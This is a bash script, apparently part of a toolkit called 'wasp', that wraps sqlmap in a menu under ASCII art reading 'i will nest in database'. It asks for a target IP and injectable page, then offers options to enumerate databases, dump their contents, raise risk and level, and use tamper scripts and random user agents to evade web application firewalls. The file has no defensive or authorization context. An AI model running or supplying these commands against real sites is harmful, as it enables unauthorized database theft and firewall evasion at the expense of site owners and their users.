#!/bin/bash
echo
cat << "EOF"

              `-.     .-'
                 \   /
  .'"'.          _\./_          .'"'.
 :   . `.      (@@\ /@@)      .'   . :
 : .     `.   :'^~^ ^~^`:   .'  .    :
  `.    .  "\.`-._'"'_.-'./" .   . .'
    `. .     `\.'.^.^.`./'     . .'
      `-._ "--:.^.^.^.^.:--" _.-'
          '--':.^.^.^.^.:'--'  
            ,/'`..^.^..'`\.    
            "   .'.-'_.`.  "  
              .'.' .'  .'`-._
             :.' .'  .' .'  .'--.._,*
             ::  :  .' .' .' .' :.'
              `: :  :  : :  :_.-'
                `:_ :  :__:-'
                   '"''' 
i will nest in database 
EOF
echo
echo -e "\e[1;92m:::::::Database Assessment :::::::.\e[0m"
echo -e "\e[1;32mPlease enter Target IP:\e[0m"
read ip
echo
echo -e "\e[1;31m1. $ip.\e[0m"
echo -e "\e[1;32mPlease enter Exploit page:\e[0m"
echo "Example: /index.php?p=&forymaction=search"
read page
echo -e "\e[1;31m1. $ip/$page.\e[0m"
echo
echo -e "\e[1;32m[1]. sqlmap.\e[0m"
echo -e "\e[1;32m[2]. Database Dump .\e[0m"
echo -e "\e[1;36m[3]. risk3 random.\e[0m"
echo -e "\e[1;36m[4]. tamper space2mysqlblank.py.\e[0m"
echo -e "\e[1;36m[5]. identify Waf.\e[0m"
echo -e "\e[1;36m[6]. tamper space comment.\e[0m"
echo -e "\e[1;36m[7]. bypass2.\e[0m"
echo -e "\e[1;32m[8]. back.\e[0m"
echo -e "\e[1;32m[9]. main.\e[0m"
echo
echo
echo -e "\e[1;32m1. Choice.\e[0m"
read choice

echo $choice
case $choice in
     1) sqlmap -u "$ip/$page" --dbs   ;;
     2) sqlmap -u "$ip/$page" --dump ;;
     3) sqlmap -u "$ip/$page" --level=5 --risk=3 --random-agent --user-agent -v3 --batch --threads=10 --dbs  ;;
     4) sqlmap -u "$ip/$page" --dbms="MySQL" -v3 --technique U --tamper="space2mysqlblank.py" --dbs ;;
     5) sqlmap -u "$ip/$page" --identify-waf --random-agent -v 3 --tamper="between,randomcase,space2comment" --dbs ;;
     6) sqlmap -u "$ip/$page" --dbms="MySQL" -v3 --technique U --tamper="space2comment" --dbs ;;
     7) wasp ;;
     8) /usr/share/wasp/dmassessmnt.sh ;;
     9) wasp ;;
     *) echo; echo "Invalid choice."; echo
esac
